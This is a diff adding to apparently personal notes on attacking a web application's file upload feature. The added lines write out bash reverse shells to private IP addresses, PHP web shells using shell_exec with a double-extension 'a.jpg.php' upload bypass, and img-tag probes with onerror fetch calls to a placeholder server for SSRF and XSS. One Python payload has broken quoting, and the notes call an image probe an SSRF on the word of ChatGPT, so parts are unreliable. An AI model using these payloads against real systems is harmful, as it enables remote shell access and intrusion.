@@ -150,3 +150,62 @@ p=subprocess.call(["/bin/bash","-i"]);
 still didn't worked
 
 There is something  interesting i found that whenever i  uploads a php file and opens up the uploadded php files in a new tab it downloads the file instead of oopening it into a new tab.
+
+
+I also tried some payload too but they also did not worked.
+
+Some simple payloads are 
+
+simple payload 1
+
+```python
+import os
+os.system(bash -c bash -i >& /dev/tcp/192.168.164.54/1234 0>&1)
+
+```
+
+simple payload 2
+
+```bash
+/bin/bash -i >& /dev/tcp/192.168.29.213/1234 0>&1
+```
+simple payload 3
+
+```php
+<?php echo shell_exec(whoami); ?>
+```
+
+simple payload 4
+
+```
+<?php echo shell_exec(whoami); ?>
+```
+above one with a different name and a.jpg.php
+
+
+since after uploading the file and opening it into a new tab doesn't download the files as the regular php files gets downloads instead it opens up into a new tab.
+
+
+Our buddy chatgpt already confirmed that its a ssrf if the payload 
+
+```
+<img src="http://YOUR-IP:8000/test">
+```
+
+gets executed.
+
+And if it is a xss then below will happens 
+
+```
+<img src="x" onerror="fetch('http://YOUR-IP:8000/xss')">
+
+Watch your server logs.
+
+Result:
+You get a hit → browser executed JS (XSS)
+```
+and i can get the onerror only via the onerror
+
+```
+<img src="invalid.jpg" onerror="alert(1)">
+```
